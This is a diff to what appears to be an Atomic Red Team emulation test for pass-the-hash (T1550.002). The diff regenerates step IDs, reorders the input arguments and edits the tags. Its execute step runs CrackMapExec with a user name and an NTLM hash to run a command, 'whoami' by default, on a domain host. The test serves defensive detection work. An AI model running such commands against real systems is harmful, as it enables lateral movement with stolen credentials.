@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "690f4bc0-564b-4826-a915-9ad5bd477704",
+      "id": "17f0894c-fe05-49ae-b241-7e9f2bd69579",
       "type": "execute-command",
       "data": {
         "command": "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "51886c96-2a3c-472c-90bc-f3d079cca579",
+      "id": "e68e4ab6-82c6-45e7-9a1f-69ce7039745b",
       "name": "Check dependency 1/1",
       "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "f631ca08-1f4b-4a94-82f4-4c99c4e30dd6",
+      "id": "02f1f40b-37ef-4a8b-9f95-e1a63d8c3c74",
       "name": "Resolve dependency 1/1",
       "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "1ae53db8-0a1b-4e72-98db-27fab591a949",
+      "id": "d76c1942-7066-48eb-9e0c-4cf325481e6f",
       "name": "Re-check dependency 1/1",
       "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
       "type": "execute-command",
@@ -51,31 +51,43 @@
   ],
   "flows": [
     {
-      "s": "51886c96-2a3c-472c-90bc-f3d079cca579",
+      "s": "e68e4ab6-82c6-45e7-9a1f-69ce7039745b",
       "p": "on-success",
-      "o": "690f4bc0-564b-4826-a915-9ad5bd477704"
+      "o": "17f0894c-fe05-49ae-b241-7e9f2bd69579"
     },
     {
-      "s": "51886c96-2a3c-472c-90bc-f3d079cca579",
+      "s": "e68e4ab6-82c6-45e7-9a1f-69ce7039745b",
       "p": "on-failure",
-      "o": "f631ca08-1f4b-4a94-82f4-4c99c4e30dd6"
+      "o": "02f1f40b-37ef-4a8b-9f95-e1a63d8c3c74"
     },
     {
-      "s": "f631ca08-1f4b-4a94-82f4-4c99c4e30dd6",
+      "s": "02f1f40b-37ef-4a8b-9f95-e1a63d8c3c74",
       "p": "on-success",
-      "o": "1ae53db8-0a1b-4e72-98db-27fab591a949"
+      "o": "d76c1942-7066-48eb-9e0c-4cf325481e6f"
     },
     {
-      "s": "1ae53db8-0a1b-4e72-98db-27fab591a949",
+      "s": "d76c1942-7066-48eb-9e0c-4cf325481e6f",
       "p": "on-failure",
-      "o": "690f4bc0-564b-4826-a915-9ad5bd477704"
+      "o": "17f0894c-fe05-49ae-b241-7e9f2bd69579"
     }
   ],
   "tags": [
-    "T1550.002",
-    "atomic-red-team"
+    "T1550",
+    "T1550.002"
   ],
   "input_arguments": [
+    {
+      "name": "ntlm",
+      "type": "string",
+      "description": "command",
+      "value": "cc36cf7a8514893efccd3324464tkg1a"
+    },
+    {
+      "name": "domain",
+      "type": "string",
+      "description": "domain",
+      "value": "%userdnsdomain%"
+    },
     {
       "name": "user_name",
       "type": "string",
@@ -93,18 +105,6 @@
       "type": "string",
       "description": "command to execute",
       "value": "whoami"
-    },
-    {
-      "name": "ntlm",
-      "type": "string",
-      "description": "command",
-      "value": "cc36cf7a8514893efccd3324464tkg1a"
-    },
-    {
-      "name": "domain",
-      "type": "string",
-      "description": "domain",
-      "value": "%userdnsdomain%"
     }
   ]
 }
